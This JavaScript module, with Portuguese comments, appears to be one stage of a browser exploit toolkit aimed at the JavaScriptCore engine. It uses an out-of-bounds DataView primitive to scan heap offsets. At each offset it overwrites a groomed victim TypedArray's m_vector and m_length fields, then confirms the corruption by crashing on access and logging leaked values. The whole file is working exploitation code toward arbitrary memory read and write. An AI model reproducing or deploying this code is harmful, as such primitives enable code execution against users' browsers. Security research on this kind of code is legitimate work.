// js/victim_corruptor.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';

let _CURRENT_TEST_GAP = 0;
let _last_successful_gap = null;
const FNAME_BASE = "VictimCorruptor";

// Getters e Setters para as variáveis de estado do módulo
export function getCurrentTestGap() { return _CURRENT_TEST_GAP; }
export function setCurrentTestGap(value) { _CURRENT_TEST_GAP = value; }
export function getLastSuccessfulGap() { return _last_successful_gap; }
export function setLastSuccessfulGap(value) { _last_successful_gap = value; }
export function resetLastSuccessfulGap() { _last_successful_gap = null; }

export async function testCorruptKnownGap() {
    if (getLastSuccessfulGap() === null) {
        log("Nenhum GAP de sucesso conhecido para testar.", "warn", `${FNAME_BASE}.testCorruptKnownGap`);
        return;
    }
    log(`Testando corrupção no GAP conhecido: ${getLastSuccessfulGap()}`, "test", `${FNAME_BASE}.testCorruptKnownGap`);
    await try_corrupt_fields_for_gap(getLastSuccessfulGap());
}

export async function try_corrupt_fields_for_gap(current_gap_to_test) {
    const FNAME_TRY_FIELDS = `${FNAME_BASE}.try_corrupt_fields_for_gap`;
    // Inicializa flags de corrupção real como false
    let result = {
        gap: current_gap_to_test,
        mvector_corrupted_victim: false, // Indica corrupção REAL do m_vector da vítima
        mlength_corrupted_victim: false, // Indica corrupção REAL do m_length da vítima
        mvector_write_to_oob_confirmed: false, // Escrita no offset do OOB buffer foi OK
        mlength_write_to_oob_confirmed: false, // Escrita no offset do OOB buffer foi OK
        mvector_read_original_from_oob: "N/A", // O que foi lido do OOB no offset do m_vector
        mlength_read_original_from_oob: "N/A", // O que foi lido do OOB no offset do m_length
        crashed_or_error: false
    };

    if (Groomer.victim_object_type !== 'TypedArray' || !Groomer.victim_object) {
        log("Vítima não é TypedArray ou não alocada.", "error", FNAME_TRY_FIELDS);
        return result;
    }
    if (!Core.oob_dataview_real) {
        log("Primitiva OOB não ativa.", "error", FNAME_TRY_FIELDS);
        return result;
    }

    const victim_jscell_rel_offset_from_oob_logical_start = Core.getInitialBufferSize() + current_gap_to_test;

    // --- Teste do m_vector ---
    const m_vector_field_abs_offset_in_jscell = Core.getJSCOffsets().TypedArray.M_VECTOR_OFFSET;
    const m_vector_field_rel_offset_from_oob_base = victim_jscell_rel_offset_from_oob_logical_start + m_vector_field_abs_offset_in_jscell;
    const m_vector_field_abs_offset_in_dv = Core.getBaseOffsetInDV() + m_vector_field_rel_offset_from_oob_base;

    log(`  GAP ${current_gap_to_test}: Tentando R/W m_vector em abs_dv_offset ${m_vector_field_abs_offset_in_dv}`, "subtest", FNAME_TRY_FIELDS);

    if (m_vector_field_abs_offset_in_dv < 0 || m_vector_field_abs_offset_in_dv + 8 > Core.oob_dataview_real.buffer.byteLength) {
        log(`     ↳ m_vector target (abs_dv ${m_vector_field_abs_offset_in_dv}) FORA DO ALCANCE. Pulando GAP para m_vector.`, "warn", FNAME_TRY_FIELDS);
        // Não retorna result aqui, pois ainda pode testar m_length
    } else {
        let original_mvector_from_oob = Core.oob_read_relative(m_vector_field_rel_offset_from_oob_base, 8);
        result.mvector_read_original_from_oob = original_mvector_from_oob ? original_mvector_from_oob.toString(true) : "null/erro";

        if (original_mvector_from_oob instanceof AdvancedInt64 && !original_mvector_from_oob.isZero() && !original_mvector_from_oob.toString(false).toLowerCase().includes("aaaa")) {
            log(`     ↳ GAP ${current_gap_to_test}: LEITURA DO OOB BUFFER no offset do m_vector: ${result.mvector_read_original_from_oob} (Potencialmente o m_vector real se sobreposto)`, "leak", FNAME_TRY_FIELDS);
        } else {
            log(`     ↳ GAP ${current_gap_to_test}: Leitura do OOB BUFFER no offset do m_vector retornou lixo/zero: ${result.mvector_read_original_from_oob}`, "info", FNAME_TRY_FIELDS);
        }

        const crash_test_mvector_addr = AdvancedInt64.One;
        log(`       Tentando escrever NOVO m_vector (${crash_test_mvector_addr.toString(true)}) no offset do OOB Buffer...`, "vuln", FNAME_TRY_FIELDS);
        Core.oob_write_relative(m_vector_field_rel_offset_from_oob_base, crash_test_mvector_addr, 8);
        await PAUSE_LAB(50);

        let written_mvector_in_oob = Core.oob_read_relative(m_vector_field_rel_offset_from_oob_base, 8);
        if (written_mvector_in_oob instanceof AdvancedInt64 && written_mvector_in_oob.equals(crash_test_mvector_addr)) {
            log(`       CONFIRMADO: Escrita de ${crash_test_mvector_addr.toString(true)} no offset alvo do OOB buffer foi bem-sucedida.`, "good", FNAME_TRY_FIELDS);
            result.mvector_write_to_oob_confirmed = true;
        } else {
            log(`       FALHA: Escrita no offset alvo do OOB buffer NÃO foi como esperado. Lido: ${written_mvector_in_oob ? written_mvector_in_oob.toString(true) : "null/erro"}`, "warn", FNAME_TRY_FIELDS);
        }

        // Só tenta o acesso que causa crash se a escrita no OOB foi confirmada (embora o crash dependa da sobreposição real)
        if (result.mvector_write_to_oob_confirmed) {
            try {
                log(`       Tentando acessar victim_object[0] (esperando CRASH se m_vector da VÍTIMA foi ${crash_test_mvector_addr.toString(true)})...`, "critical", FNAME_TRY_FIELDS);
                let val = Groomer.victim_object[0];
                log(`       ACESSO A victim_object[0] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
                if (result.mvector_read_original_from_oob !== "N/A" && !result.mvector_read_original_from_oob.toLowerCase().includes("aaaa") && !result.mvector_read_original_from_oob.toLowerCase().includes("0x0000_0000_0000_0000")) {
                     log(`       NOTA: m_vector original (do OOB) parecia válido, escrita no OOB funcionou, mas não houve crash. GAP ${current_gap_to_test} é interessante.`, "leak", FNAME_TRY_FIELDS);
                }
            } catch (e) {
                log(`       CRASH/ERRO ESPERADO ao acessar victim_object[0] (m_vector alvo=${crash_test_mvector_addr.toString(true)}): ${e.message}`, "good", FNAME_TRY_FIELDS);
                result.crashed_or_error = true;
                result.mvector_corrupted_victim = true; // CRASH é o indicador de corrupção real do m_vector da vítima
                setLastSuccessfulGap(current_gap_to_test);
                log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_VECTOR)!`, "vuln", FNAME_TRY_FIELDS);
                return result; // Sai cedo se crashar aqui
            }
        }

        // Se não crashou, e um valor "original" (do OOB) foi lido e a escrita no OOB foi confirmada, restaura o valor no OOB
        if (!result.crashed_or_error && result.mvector_write_to_oob_confirmed && original_mvector_from_oob instanceof AdvancedInt64) {
            log(`       Restaurando valor no OOB BUFFER para o offset do m_vector: ${original_mvector_from_oob.toString(true)}`, "tool", FNAME_TRY_FIELDS);
            Core.oob_write_relative(m_vector_field_rel_offset_from_oob_base, original_mvector_from_oob, 8);
            await PAUSE_LAB(50);
        }
    } // Fim do if que checa se m_vector_field está dentro dos limites

    // --- Teste do m_length ---
    const m_length_field_abs_offset_in_jscell = Core.getJSCOffsets().TypedArray.M_LENGTH_OFFSET;
    const m_length_field_rel_offset_from_oob_base = victim_jscell_rel_offset_from_oob_logical_start + m_length_field_abs_offset_in_jscell;
    const m_length_field_abs_offset_in_dv = Core.getBaseOffsetInDV() + m_length_field_rel_offset_from_oob_base;

    log(`  GAP ${current_gap_to_test}: Tentando R/W m_length em abs_dv_offset ${m_length_field_abs_offset_in_dv}`, "subtest", FNAME_TRY_FIELDS);
    if (m_length_field_abs_offset_in_dv < 0 || m_length_field_abs_offset_in_dv + 4 > Core.oob_dataview_real.buffer.byteLength) {
        log(`     ↳ m_length target (abs_dv ${m_length_field_abs_offset_in_dv}) FORA DO ALCANCE.`, "warn", FNAME_TRY_FIELDS);
    } else {
        let original_mlength_from_oob = Core.oob_read_relative(m_length_field_rel_offset_from_oob_base, 4);
        result.mlength_read_original_from_oob = toHexS1(original_mlength_from_oob);

        // Compara o que foi lido do OOB buffer com o length real da vítima.
        // Se forem iguais e não for o padrão de preenchimento, é um bom sinal.
        if (typeof original_mlength_from_oob === 'number' && Groomer.victim_object && original_mlength_from_oob === Groomer.victim_object.length && original_mlength_from_oob !== 0xAAAAAAAA) {
            log(`     ↳ GAP ${current_gap_to_test}: LEITURA DO OOB BUFFER no offset do m_length: ${result.mlength_read_original_from_oob} (Corresponde ao victim.length! POTENCIALMENTE o m_length real se sobreposto)`, "leak", FNAME_TRY_FIELDS);
        } else {
            log(`     ↳ GAP ${current_gap_to_test}: Leitura do OOB BUFFER no offset do m_length retornou ${result.mlength_read_original_from_oob} (Esperado da vítima: ${Groomer.victim_object ? Groomer.victim_object.length : 'N/A'}).`, "info", FNAME_TRY_FIELDS);
        }

        const large_mlength_val = 0x7FFFFFFF;
        log(`       Tentando escrever NOVO m_length (${toHexS1(large_mlength_val)}) no offset do OOB Buffer...`, "vuln", FNAME_TRY_FIELDS);
        Core.oob_write_relative(m_length_field_rel_offset_from_oob_base, large_mlength_val, 4);
        await PAUSE_LAB(50);

        let written_mlength_in_oob = Core.oob_read_relative(m_length_field_rel_offset_from_oob_base, 4);
        if (typeof written_mlength_in_oob === 'number' && written_mlength_in_oob === large_mlength_val) {
            log(`       CONFIRMADO: Escrita de ${toHexS1(large_mlength_val)} no offset alvo do OOB buffer foi bem-sucedida.`, "good", FNAME_TRY_FIELDS);
            result.mlength_write_to_oob_confirmed = true;
        } else {
            log(`       FALHA: Escrita no offset alvo do OOB buffer NÃO foi como esperado. Lido: ${toHexS1(written_mlength_in_oob)}`, "warn", FNAME_TRY_FIELDS);
        }

        if (result.mlength_write_to_oob_confirmed && Groomer.victim_object) {
            try {
                const far_index = (Groomer.victim_object.length || 72) + 100000; // Usa um length base se o da vítima for 0 por algum motivo
                log(`       Tentando acessar victim_object[${far_index}] (esperando CRASH se m_length da VÍTIMA foi ${toHexS1(large_mlength_val)})...`, "critical", FNAME_TRY_FIELDS);
                let val = Groomer.victim_object[far_index];
                log(`       ACESSO A victim_object[${far_index}] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
            } catch (e) {
                log(`       CRASH/ERRO ESPERADO ao acessar victim_object[${far_index}] (m_length alvo=${toHexS1(large_mlength_val)}): ${e.message}`, "good", FNAME_TRY_FIELDS);
                result.crashed_or_error = true;
                result.mlength_corrupted_victim = true; // CRASH é o indicador de corrupção real do m_length da vítima
                setLastSuccessfulGap(current_gap_to_test);
                log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_LENGTH)!`, "vuln", FNAME_TRY_FIELDS);
                // Não retorna aqui, pois o teste de m_vector pode ter sido mais interessante ou já retornado.
            }
        }
        // Se não crashou, e um valor "original" (do OOB) foi lido e a escrita no OOB foi confirmada, restaura o valor no OOB
        if (!result.crashed_or_error && result.mlength_write_to_oob_confirmed && typeof original_mlength_from_oob === 'number') {
            log(`       Restaurando valor no OOB BUFFER para o offset do m_length: ${toHexS1(original_mlength_from_oob)}`, "tool", FNAME_TRY_FIELDS);
            Core.oob_write_relative(m_length_field_rel_offset_from_oob_base, original_mlength_from_oob, 4);
        }
    } // Fim do if que checa se m_length_field está dentro dos limites

    return result;
}

export async function findAndCorruptVictimFields_Iterative() {
    const FNAME = `${FNAME_BASE}.findAndCorrupt`;
    log(`--- Iniciando ${FNAME} ---`, 'test', FNAME);
    if (!Groomer.victim_object || Groomer.victim_object_type !== 'TypedArray') {
        log("ERRO: Vítima não preparada. Execute o Passo 1 (ou uma estratégia de grooming) primeiro.", "error", FNAME); return;
    }
    if (!Core.oob_dataview_real) { log("ERRO: Primitiva OOB não ativa. Execute o Passo 0.", "error", FNAME); return; }

    const gapStartEl = document.getElementById('gapStartScan');
    const gapEndEl = document.getElementById('gapEndScan');
    const gapStepEl = document.getElementById('gapStepScan');

    const gapStart = gapStartEl ? parseInt(gapStartEl.value) : NaN;
    const gapEnd = gapEndEl ? parseInt(gapEndEl.value) : NaN;
    const gapStep = gapStepEl ? parseInt(gapStepEl.value) : NaN;

    if (isNaN(gapStart) || isNaN(gapEnd) || isNaN(gapStep) || gapStep === 0) { log("ERRO: Configuração de faixa de GAP inválida.", "error", FNAME); return; }
    log(`   Iniciando busca de GAP de ${gapStart} a ${gapEnd}, passo ${gapStep}.`, "info", FNAME); await PAUSE_LAB(1000);

    let best_gap_info_no_crash = null;

    for (let current_gap = gapStart; current_gap <= gapEnd; current_gap += gapStep) {
        if (getLastSuccessfulGap() !== null) {
            log(`GAP de sucesso (${getLastSuccessfulGap()}) já encontrado. Interrompendo busca iterativa.`, "good", FNAME);
            break;
        }
        log(`Testando GAP: ${current_gap}`, "test", FNAME);
        setCurrentTestGap(current_gap);
        const result = await try_corrupt_fields_for_gap(current_gap);

        if (result.crashed_or_error) {
            // last_successful_gap já foi definido dentro de try_corrupt_fields_for_gap
            log(`CORRUPÇÃO DE CAMPO DA VÍTIMA BEM SUCEDIDA (CRASH/ERRO OBSERVADO) com GAP = ${getLastSuccessfulGap()}!`, "critical", FNAME);
            log(`   Detalhes -> m_vector no OOB: ${result.mvector_read_original_from_oob}, m_length no OOB: ${result.mlength_read_original_from_oob}`, "leak", FNAME);
            break; // Sai do loop de GAPs
        } else if (result.mvector_write_to_oob_confirmed || result.mlength_write_to_oob_confirmed) {
             // Se houve escrita confirmada no OOB mas sem crash, este GAP pode ser interessante.
             if (!best_gap_info_no_crash) best_gap_info_no_crash = result;
             log(`   GAP ${current_gap}: Escrita no OOB BUFFER confirmada SEM CRASH. m_vector_oob_ok: ${result.mvector_write_to_oob_confirmed}, m_length_oob_ok: ${result.mlength_write_to_oob_confirmed}`, "good", FNAME);
             log(`     Valores lidos do OOB -> m_vector: ${result.mvector_read_original_from_oob}, m_length: ${result.mlength_read_original_from_oob}`, "leak", FNAME);
        } else if (result.mvector_read_original_from_oob !== "N/A" && !result.mvector_read_original_from_oob.toLowerCase().includes("aaaa") && !result.mvector_read_original_from_oob.toLowerCase().includes("0x0000_0000_0000_0000")) {
             // Se leu algo potencialmente válido do OOB buffer (não lixo, não zero)
             if (!best_gap_info_no_crash) best_gap_info_no_crash = result;
             log(`   GAP ${current_gap}: Leitura do OOB BUFFER para m_vector retornou ${result.mvector_read_original_from_oob}. Nenhuma corrupção da vítima confirmada por crash.`, "info", FNAME);
        }

        await PAUSE_LAB(300);
        if (document.hidden) { log("Busca abortada, página não visível.", "warn", FNAME); break; }
        if (current_gap < gapEnd && (current_gap + gapStep) > gapEnd && (current_gap + gapStep) !== gapEnd ) {
            current_gap = gapEnd - gapStep; // Garante que o valor final da faixa seja testado
        }
    }

    if (getLastSuccessfulGap() !== null) {
        log(`Busca iterativa concluída. GAP PROMISSOR (causou crash/erro): ${getLastSuccessfulGap()}`, "vuln", FNAME);
        log("   VOCÊ TEM UMA FORTE INDICAÇÃO DE CONTROLE SOBRE OS CAMPOS DA VÍTIMA!", "vuln", FNAME);
    } else if (best_gap_info_no_crash) {
         log("Busca iterativa concluída. Nenhum crash/erro induzido, mas alguns GAPs mostraram atividade no OOB Buffer:", "warn", FNAME);
         log(`   Melhor Candidato (sem crash): GAP ${best_gap_info_no_crash.gap}, m_vector (OOB): ${best_gap_info_no_crash.mvector_read_original_from_oob}, m_length (OOB): ${best_gap_info_no_crash.mlength_read_original_from_oob}`, "leak", FNAME);
         log(`     Escrita OOB ok -> m_vector: ${best_gap_info_no_crash.mvector_write_to_oob_confirmed}, m_length: ${best_gap_info_no_crash.mlength_write_to_oob_confirmed}`, "info", FNAME);
    } else {
        log("Busca iterativa de GAP concluída. Nenhuma atividade promissora no OOB buffer ou corrupção da vítima confirmada.", "error", FNAME);
    }
    log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
}
